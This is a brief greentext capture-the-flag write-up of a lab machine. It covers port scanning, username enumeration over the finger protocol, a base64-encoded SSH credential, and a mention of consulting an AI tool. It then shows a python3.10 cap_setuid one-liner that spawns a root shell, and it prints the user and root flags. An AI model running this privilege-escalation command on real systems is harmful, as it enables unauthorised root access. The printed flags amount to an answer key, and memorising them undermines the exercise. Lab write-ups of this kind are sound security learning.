>be me
>17yo tgirl playing ctfs
>rustscan the machine
>see port 80, ssh, and finger protocol, port 79
>open it on my web browser
>static site
>there's various names
>netcat to port 79, enumerate username
>found ZmFiaWFubzpvM2pWVGt0YXJHUUkwN3E= on fabiano
>decoded to fabiano:o3jVTktarGQI07q
>nice
>ssh login
>i'm in
>cat user.txt, found THM{bishop_to_c4_check}
>root to go
>talk to arcanum chatgpt
>getcap -r / 2>/dev/null
>there's /usr/bin/python3.10 cap_setuid=ep
>neat setuid
>/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
>root!
>cat /root/root.txt
>THM{check_check_check_mate}, got it!
